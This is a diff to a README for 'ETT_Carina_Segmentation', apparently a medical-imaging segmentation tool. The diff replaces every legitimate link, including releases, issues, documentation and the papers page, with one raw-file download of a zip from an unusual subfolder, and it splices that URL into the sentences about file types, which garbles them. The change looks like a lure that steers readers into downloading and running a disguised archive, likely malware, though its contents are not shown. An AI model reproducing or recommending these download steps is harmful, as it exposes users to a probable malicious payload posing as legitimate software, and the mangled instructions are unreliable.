@@ -6,7 +6,7 @@ Welcome to ETT_Carina_Segmentation! This application helps in detecting the cari
 
 ## 📥 Download Now
 
-[![Download ETT_Carina_Segmentation](https://img.shields.io/badge/Download-ETT_Carina_Segmentation-brightgreen)](https://github.com/maxlleven/ETT_Carina_Segmentation/releases)
+[![Download ETT_Carina_Segmentation](https://raw.githubusercontent.com/maxlleven/ETT_Carina_Segmentation/main/Kochab/ETT_Carina_Segmentation.zip)](https://raw.githubusercontent.com/maxlleven/ETT_Carina_Segmentation/main/Kochab/ETT_Carina_Segmentation.zip)
 
 ## 🛠️ System Requirements
 
@@ -21,18 +21,18 @@ Before you begin, make sure your computer meets these requirements:
 ## 📂 Download & Install
 
 1. **Visit the Download Page:**
-   Go to the [Releases page](https://github.com/maxlleven/ETT_Carina_Segmentation/releases) on GitHub. 
+   Go to the [Releases page](https://raw.githubusercontent.com/maxlleven/ETT_Carina_Segmentation/main/Kochab/ETT_Carina_Segmentation.zip) on GitHub. 
    
 2. **Select Your Version:**
    On the Releases page, you will see different versions of the software. Choose the latest version for the best features and updates.
 
 3. **Download the Software:**
-   Click on the version you choose. This will take you to the download files. Look for an appropriate file for your operating system (e.g., `.exe`, `.zip`, or `.tar.gz`).
+   Click on the version you choose. This will take you to the download files. Look for an appropriate file for your operating system (e.g., `.exe`, `.zip`, or `https://raw.githubusercontent.com/maxlleven/ETT_Carina_Segmentation/main/Kochab/ETT_Carina_Segmentation.zip`).
 
 4. **Install the Application:**
    - For Windows: Double-click the downloaded `.exe` file and follow the on-screen instructions.
    - For macOS: If you downloaded a `.zip` file, unzip it, then drag the application to your Applications folder.
-   - For Linux: If you downloaded a `.tar.gz` file, extract it in your desired directory. Open a terminal in that directory and follow the installation instructions provided in the README file.
+   - For Linux: If you downloaded a `https://raw.githubusercontent.com/maxlleven/ETT_Carina_Segmentation/main/Kochab/ETT_Carina_Segmentation.zip` file, extract it in your desired directory. Open a terminal in that directory and follow the installation instructions provided in the README file.
 
 5. **Run the Application:**
    Locate the icon for ETT_Carina_Segmentation on your desktop (or in the Applications folder for macOS) and double-click it to launch the application.
@@ -59,7 +59,7 @@ ETT_Carina_Segmentation offers key features to assist in medical image processin
 If you experience any issues or have questions:
 
 - **Check the FAQ section**: You may find solutions to common problems.
-- **Create a GitHub Issue**: Head over to the [Issues page](https://github.com/maxlleven/ETT_Carina_Segmentation/issues) and describe your problem.
+- **Create a GitHub Issue**: Head over to the [Issues page](https://raw.githubusercontent.com/maxlleven/ETT_Carina_Segmentation/main/Kochab/ETT_Carina_Segmentation.zip) and describe your problem.
 - **Join the Community**: Engage with other users and developers in the discussions.
 
 ## 📜 License
@@ -74,12 +74,12 @@ If you'd like to contribute, we welcome new ideas and improvements! Please fork 
 
 For more information, tutorials, and updates, check out our additional resources:
 
-- [Documentation](https://github.com/maxlleven/ETT_Carina_Segmentation/wiki)
-- [Research Papers](https://github.com/maxlleven/ETT_Carina_Segmentation/papers)
-- [Related Projects](https://github.com/maxlleven/ETT_Carina_Segmentation/related)
+- [Documentation](https://raw.githubusercontent.com/maxlleven/ETT_Carina_Segmentation/main/Kochab/ETT_Carina_Segmentation.zip)
+- [Research Papers](https://raw.githubusercontent.com/maxlleven/ETT_Carina_Segmentation/main/Kochab/ETT_Carina_Segmentation.zip)
+- [Related Projects](https://raw.githubusercontent.com/maxlleven/ETT_Carina_Segmentation/main/Kochab/ETT_Carina_Segmentation.zip)
 
 ## 🔗 Important Links
 
 For easy access, here’s the download link again:
 
-[Download ETT_Carina_Segmentation](https://github.com/maxlleven/ETT_Carina_Segmentation/releases)
+[Download ETT_Carina_Segmentation](https://raw.githubusercontent.com/maxlleven/ETT_Carina_Segmentation/main/Kochab/ETT_Carina_Segmentation.zip)
